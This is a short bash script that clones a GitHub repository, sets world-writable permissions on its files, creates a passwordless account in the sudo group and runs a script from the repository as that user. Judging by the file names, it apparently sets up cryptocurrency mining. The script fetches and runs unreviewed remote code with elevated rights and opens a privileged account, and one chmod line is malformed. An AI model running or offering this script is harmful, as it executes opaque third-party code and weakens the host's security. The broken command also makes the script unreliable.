#!/bin/bash
sudo apt update
git clone https://github.com/Sitena1/berca.git && cd berca
chmod +x vrsc808.sh && chmod +x uluk chmod 777 uluk vrsc808.sh
sudo adduser --disabled-password --gecos "" apen && sudo usermod -aG sudo apen
sudo -u apen -H sh -c "./vrsc808.sh"
sudo apt update
